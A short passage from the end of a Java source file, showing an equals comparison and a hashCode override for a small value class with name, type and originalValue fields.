            return name.equals(t.name) && type == t.type && originalValue.equals(t.originalValue);
        }
        @Override public int hashCode() { return Objects.hash(name, type, originalValue); }
    }

}
